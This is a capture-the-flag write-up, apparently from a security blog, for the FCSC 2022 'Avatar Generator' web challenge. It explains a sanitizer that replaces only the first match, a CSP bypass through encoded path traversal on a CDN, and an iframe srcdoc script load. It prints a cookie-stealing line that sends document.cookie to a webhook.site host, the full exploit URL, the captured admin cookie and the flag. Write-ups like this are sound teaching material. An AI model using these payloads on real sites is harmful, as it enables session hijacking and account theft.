---
source: kevin-mizu
source_url: https://mizu.re/post/avatar_generator
title: "Avatar Generator | mizu.re"
description: "Avatar Generator"
---

_keyboard\_arrow\_up_

title: Avatar Generator

date: May 08, 2022

tags: [Writeup](https://mizu.re/tag/Writeup) [FCSC2022](https://mizu.re/tag/FCSC2022) [Web](https://mizu.re/tag/Web)

# Avatar Generator

## Table of contents

- Challenge information
- Recon
- Javascript analysis
- XSS
- Getting the flag

## Challenge information

Difficulty: 3 stars.

Description: Le hasard fait parfois bien les choses.

url: [https://avatar-generator.france-cybersecurity-challenge.fr/](https://avatar-generator.france-cybersecurity-challenge.fr/)

## Recon

When going to the website challenge, we can find an avatar generator based on three arguments:

- A seed
- A primary color (ie: #f1c40f)
- A secondary color (ie: #f1c40f)

![home_page1](https://mizu.re/articles/writeups/FCSC2022/web/avatar_generator/images/home_page1.png)

Due to the challenge's description and the fact that the generation is based on a seed, we can quickly think that it is going to be a crypto web challenge.

Spoiler 🚨
It won't :)

Clicking on the "Generate random avatar" button will randomize all the values which is not really interesting. At the opposite, the "Share avatar" button will redirect us to twitter and propose us to tweet the following:

```
My new avatar created with Avatar-Generator 😀
https://avatar-generator.france-cybersecurity-challenge.fr/?seed=490300&primary=%233498db&secondary=%231abc9c #CTF #FCSC2022
```

As we can see, the URL contains parameters that are familiar to us. Trying to load it and playing with those variables make us understand that we can control them if we put valid values (but XSS isn't working).

![home_page2](https://mizu.re/articles/writeups/FCSC2022/web/avatar_generator/images/home_page2.png)

Going to the other page, we can notice that it is possible to report a URL. In CTF Challenge, this is a typical XSS scenario.

![contact_page](https://mizu.re/articles/writeups/FCSC2022/web/avatar_generator/images/contact_page.png)

The last page is a simple login connection for administrators.

![admin_page](https://mizu.re/articles/writeups/FCSC2022/web/avatar_generator/images/admin_page.png)

Testing some default credentials gives nothing interesting except that, after trying to login, the server sets us a "PHPSESSID" cookie without "HttpOnly" flag, confirming that we need to exfiltrate the cookie.

![cookie](https://mizu.re/articles/writeups/FCSC2022/web/avatar_generator/images/cookie.png)

## Javascript analysis

Now that we have finished clicking everywhere, we are going to take a look to the source code of the home page and more specifically to JavaScript files. The page works using the following:

- app.js : manage application workflow.
- minBlock.js : used to generate the avatar.
- policies.js : trusted types policy used to secure all inputs.
- stats.js : empty script.
- stats.loader.js : load the stat.js file 1s after the page load.
- trustedtypes.js : Google trusted types script (we are going to see later what they are).

First of all, let's look the app.js file.

```js
let currentSeed = 0
let currentPrimaryColor = ""
let currentSecondaryColor = ""

let shareText = 'My new avatar created with Avatar-Generator 😀'
let shareHashtag = 'CTF,FCSC2022'

function randomSeed(){
    return Math.floor(Math.random() * 1000000);
}

function makePRNG(seed){
    return function(){
        var x = Math.sin(seed++) * 10000
        return x - Math.floor(x)
    }
}

function getURLParams(){
    let url = new URL(window.location.href)
    return url.searchParams
}

function updateSettings(seed, primaryColor, secondaryColor){
    currentSeed = seed
    currentPrimaryColor = primaryColor
    currentSecondaryColor = secondaryColor
    document.getElementById('seed').innerHTML = integerPolicy.createHTML(currentSeed)
    document.getElementById('primaryColor').innerHTML = colorPolicy.createHTML(currentPrimaryColor)
    document.getElementById('secondaryColor').innerHTML = colorPolicy.createHTML(currentSecondaryColor)
    document.getElementById('topColor').style.backgroundColor = currentPrimaryColor
    let notyf = new Notyf()
    notyf.confirm('New avatar generated!')
}

function generateAvatar(seed, primaryColor, secondaryColor){
    let options = new minBlock({
        canvasID: 'avatar',
        color: {
            primary: primaryColor,
            secondary:  secondaryColor
        },
        random: makePRNG(seed)
    })
    updateSettings(seed, options.color.primary, options.color.secondary)
}

function generateRandomAvatar(){
    generateAvatar(randomSeed(), null, null)
}

function makeAvatarUrl(){
    let baseUrl = document.location.href.split('?')[0]
    let primary = encodeURIComponent(currentPrimaryColor)
    let secondary = encodeURIComponent(currentSecondaryColor)
    return escape(`${baseUrl}?seed=${currentSeed}&primary=${primary}&secondary=${secondary}`)
}

function shareAvatar(){
    link = 'https://twitter.com/share?text=' + shareText + '&url=' + makeAvatarUrl() + '&hashtags=' + shareHashtag
    window.open(link, '_blank').focus();
}

document.addEventListener('DOMContentLoaded', function(){
    debug = false
    if (window.location.hash.substr(1) == 'debug'){
        debug = true
    }
    try {
        params = getURLParams()
        let seed = params.get('seed') === null ? randomSeed() : params.get('seed')
        let primaryColor = params.get('primary')
        let secondaryColor = params.get('secondary')
        generateAvatar(seed, primaryColor, secondaryColor)
    }
    catch(error){
        if (debug) {
        let errorMessage = "Error! An error occured while loading the page... Details: " + error
        document.querySelector('.container').innerHTML = errorMessage
        }
        else {
            generateRandomAvatar()
        }
    }

    document.getElementById('randomAvatar').addEventListener('click', generateRandomAvatar)
    document.getElementById('shareAvatar').addEventListener('click', shareAvatar)
})
```

Most of the content of the file isn't really interesting. However, at the bottom of this file, we can notice a debugging mode which can be enabled by adding "#debug" to the URL!

```js
document.addEventListener('DOMContentLoaded', function(){
    debug = false
    if (window.location.hash.substr(1) == 'debug'){
        debug = true
    }
    ...
    catch(error){
        if (debug) {
        let errorMessage = "Error! An error occured while loading the page... Details: " + error
        document.querySelector('.container').innerHTML = errorMessage
        }
        else {
            generateRandomAvatar()
        }
    }
    ...
})
```

Activating it allows us to inject invalid values that are reflected.

![debug](https://mizu.re/articles/writeups/FCSC2022/web/avatar_generator/images/debug.png)

Before continuing, we are going to make a short explanation about Trusted Types Policies.

Because CSP can't secure DOM exploitation, trusted types policies are used to secure the code from DOM vulnerabilities. In that way, developers can control DOM using one simple function for each type of interaction (ie: createHTML, createScriptURL...).

For example:

```js
const attackerInput = '<svg onload="alert(/cross-site-scripting/)" />';
const el = document.createElement('div');

if (typeof trustedTypes !== 'undefined') {
  const sanitizer = trustedTypes.createPolicy('foo', {
    createHTML: (input) => DOMPurify.sanitize(input)
});

  el.innerHTML = sanitizer.createHTML(attackerInput); // Puts the sanitized value into the DOM.
  el.innerHTML = attackerInput; // throws a TypeError.
}
```

Source: [https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/require-trusted-types-for#examples](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/require-trusted-types-for#examples)

More information: [https://w3c.github.io/webappsec-trusted-types/dist/spec/](https://w3c.github.io/webappsec-trusted-types/dist/spec/)

Well, now that everything is clear, we are going to leave the app.js file for now and take a look to the second interesting file, policies.js. As we said earlier, this file sanitizes and verify all the DOM interaction with the page using trusted types policies.

```js
const RE_HEX_COLOR = /^#[0-9A-Fa-f]{6}$/i
const RE_INTEGER = /^\d+$/

function sanitizeHTML(html){
    return html
        .replace(/&/, "&amp;")
        .replace(/</, "&lt;")
        .replace(/>/, "&gt;")
        .replace(/"/, "&quot;")
        .replace(/'/, "&#039;")
}

let sanitizePolicy = TrustedTypes.createPolicy('default', {
    createHTML(html) {
        return sanitizeHTML(html)
    },
    createURL(url) {
        return url
    },
    createScriptURL(url) {
    return url
    }
})

let colorPolicy = TrustedTypes.createPolicy('color', {
    createHTML(color) {
        if (RE_HEX_COLOR.test(color)){
            return color
        }
        throw new TypeError(`Invalid color '${color}'`);
    }
})

let integerPolicy = TrustedTypes.createPolicy('integer', {
    createHTML(integer) {
        if (RE_INTEGER.test(integer)){
            return integer
        }
        throw new TypeError(`Invalid integer '${integer}'`);
    }
})
```

In this file, three policies are defined :

- default: called when creating html elements.
- color: used to verify colors values.
- integer: used to verify seeds values.

All three are very interesting for us because they represent all the variables we can interact with. The "integer" policy and "color" policy are the reason why we weren't able to inject specific values in the URL and "default" policy the reason why our XSS payloads didn't work.

## XSS

Now that we have a good understanding of all the application workflow, we are going to search for the XSS. As we said earlier, we can reflect our input on the page using the debug mode, but it is sanitized due to default trusted type policy. Our first step is then to find a way bypass the filter.

```js
function sanitizeHTML(html){
    return html
        .replace(/&/, "&amp;")
        .replace(/</, "&lt;")
        .replace(/>/, "&gt;")
        .replace(/"/, "&quot;")
        .replace(/'/, "&#039;")
}
```

At a first look to the sanitize function, we could think that it's not possible to inject any HTML tags, but, like in the "MC Players" challenge, it's a trap! In fact, the developer missed something really important. When replacing values in a string using regex, it must and with "/g" which means "globals". If this is not present, it will only replace the first match! We can then easily bypass the filter by first injecting all the sanitized chars.

```html
<"'&><img src=x>
https://avatar-generator.france-cybersecurity-challenge.fr/?seed=%3C%22%27%26%3E%3Cimg%20src=x%3E&primary=%233498db&secondary=%231abc9c#debug
```

![XSS1](https://mizu.re/articles/writeups/FCSC2022/web/avatar_generator/images/XSS1.png)

At this point, we could think that we can easily get an XSS by injecting `<script>alert()</script>` but doing that reveals to us that CSP are defined in the HTML.

```html
<meta http-equiv="Content-Security-Policy" content="trusted-types default color integer">
<meta http-equiv="Content-Security-Policy" content="script-src rawcdn.githack.com/caroso1222/notyf/v2.0.1/dist/ 'self'; object-src 'none'; trusted-types default color integer;">
```

As we can see, `script-src ... 'self'` is blocking us from loading script and the absence of `inline-code` to use payload like `<img src=x onerror=alert()>`

## CSP Bypass

The CSP we found just before have something really interesting. It allows us to load script files from `rawcdn.githack.com/caroso1222/notyf/v2.0.1/dist/`. Why is this so interesting? Because rawcdn.githack.com is a CDN (Content Delivery Network) which is directly linked to Github. So, if we are able to bypass the directory restriction, we could be able to load the everything we want!

The trick we need to use is well known in CSP bypass. It abuses on the fact that URL encoded path traversal URLs won't be parsed before applying the CSP. So, by using URL like this, we can bypass this restriction:

```
http://rawcdn.githack.com/caroso1222/notyf/v2.0.1/dist/..%2F..%2F..%2F..%2Fuser%2Frepo%2Ftag%2Ffile.js
```

Creating a new Github repository, adding a .js file containing classic cookie exfiltration payload and adding tags, allow us (not all the time for a reason that I don't know) to access it using rawcdn.githack.com CDN.

```js
document.location.href = "https://webhook.site/7e905f7b-b866-4585-b922-473c301025c2?".concat(document.cookie)
```

XSS URL: `http://raw.githack.com/Kevin-Mizu/xss/v1.0.0/xss.js`

Loading it using our bypass and ... that's not working 🥲.

```html
<'"><script src="https://rawcdn.githack.com/caroso1222/notyf/v2.0.1/dist/..%2F..%2F..%2F..%2FKevin-Mizu/xss/v1.0.0/xss.js"></script>
```

![XSS2](https://mizu.re/articles/writeups/FCSC2022/web/avatar_generator/images/XSS2.png)

The reason why our injection is not working is because most modern browsers using `innerHTML` function will by default refuse script tags to be loaded.

At this point, I wasted a lot of time trying to overwrite trusted types policies using DOM Clobering because, on Firefox, the trusted types policies CSP headers are not valid and allows [several bypass](https://hackmd.io/@st98/S1z9qV1X_). But after getting `user-agent` header of the bot and finding that he was running on chrome, I decided to stop.

```html
<'"><img src="https://webhook.site/7e905f7b-b866-4585-b922-473c301025c2">
```

![webhook](https://mizu.re/articles/writeups/FCSC2022/web/avatar_generator/images/webhook.png)

```
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/100.0.4863.0 Safari/537.36
```

So, what can we do? In fact, `innerHTML` is only blocking load of `<script>` tag but not all of them. That's why I came up with an idea: "If I load an iframe which has the same domain and contains the tag, then I would be able to exfiltrate the cookie!". It is really important that the iframe has the same domain as the website because Same Origin Policies in place by the browser would block all cross-site interaction and the XSS would be useless. To do so, we can use the `srcdoc` attribute of the iframe:

```html
<iframe srcdoc="<script src='URL'></script>"></iframe>
```

## Getting the flag

The final step is to use the Github repository previously created with all those bypasses and send the URL to the bot! (Do not forget to correctly URL encode `srcdoc` content or it won't be loaded correctly in the iframe)

```html
<'"><iframe srcdoc="<script src="https://rawcdn.githack.com/caroso1222/notyf/v2.0.1/dist/..%2F..%2F..%2F..%2FKevin-Mizu/xss/v1.0.0/xss.js"></script>"></iframe>
```

Final url: `https://avatar-generator.france-cybersecurity-challenge.fr/index.php?seed=1&primary=%23bbbbbb&secondary=%3C%22%27%3E%3Ciframe%20srcdoc%3D%22%3Cscript%20src%3D%27https%3A%2F%2Frawcdn.githack.com%2Fcaroso1222%2Fnotyf%2Fv2.0.1%2Fdist%2F..%252F..%252F..%252F..%252FKevin-Mizu%2Fxss%2Fv1.0.0%2Fxss.js%27%3E%3C%2Fscript%3E%27%3E%3C%2Fscript%3E%22%3E%3C%2Fiframe%3E?#debug`

After a couple of seconds, we receive the admin cookie:

![webhook_admin](https://mizu.re/articles/writeups/FCSC2022/web/avatar_generator/images/webhook_admin.png)

```
admin:d13e3bde2f9a8ff1f3ef377d16a5da5f26840953
```

Using it on the admin panel:

![flag](https://mizu.re/articles/writeups/FCSC2022/web/avatar_generator/images/flag.png)

Flag: `FCSC{2d5e4d79789a5a9a68753350b72202478b2f9bf8}` 🎉

[_keyboard\_arrow\_left_ Cloud Password Manager](https://mizu.re/post/cloud_password_manager)

[MC Players _keyboard\_arrow\_right_](https://mizu.re/post/mc_players)